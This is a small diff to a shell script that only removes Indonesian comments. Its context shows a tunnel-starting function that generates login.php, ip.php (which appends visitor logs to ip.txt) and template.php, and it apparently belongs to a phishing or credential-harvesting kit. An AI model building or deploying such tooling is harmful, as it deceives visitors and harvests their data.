@@ -92,7 +92,7 @@ start_tunnel() {
             ;;
     esac
 
-    # Buat login.php kalo ga ada
+
     if [[ ! -f "login.php" ]]; then
         cat > login.php << 'EOF'
 <?php
@@ -109,7 +109,7 @@ echo json_encode(['status' => 'success']);
 EOF
     fi
 
-    # Buat ip.php kalo ga ada
+
     if [[ ! -f "ip.php" ]]; then
         cat > ip.php << 'EOF'
 <?php
@@ -123,7 +123,7 @@ file_put_contents('ip.txt', $log, FILE_APPEND);
 EOF
     fi
 
-    # Buat template.php
+
     cat > template.php << 'EOF'
 <?php
 include 'ip.php';
